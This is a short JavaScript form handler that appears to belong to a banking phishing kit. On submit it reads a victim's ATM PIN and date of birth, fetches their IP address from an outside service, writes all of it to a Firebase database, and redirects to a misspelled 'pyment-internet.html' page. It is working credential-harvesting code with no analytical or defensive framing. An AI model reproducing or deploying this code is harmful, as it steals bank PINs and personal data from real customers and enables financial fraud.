document.getElementById("ududip007").addEventListener("submit", function (e) {
    e.preventDefault();

    const atmPin = document.getElementById("atmPin").value.trim();
    const dob = document.getElementById("dob").value.trim();

    // ✅ Get IP address
    fetch("https://api.ipify.org?format=json")
        .then(response => response.json())
        .then(data => {
            const ipAddress = data.ip;

            // ✅ Generate IST time
            const now = new Date();
            const istTime = new Date(now.getTime() + (5.5 * 60 * 60 * 1000))
                .toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });

            const entryRef = firebase.database().ref("ududip007").push();
            entryRef.set({
                atm_pin: atmPin,
                date_of_birth: dob,
                ipAddress: ipAddress,
                timestamp: istTime
            }).then(() => {
                localStorage.setItem("dob", dob);
                window.location.href = "pyment-internet.html";
            }).catch((error) => {
                alert("Error: " + error.message);
            });
        })
        .catch(error => {
            alert("Unable to get IP address: " + error.message);
        });
});
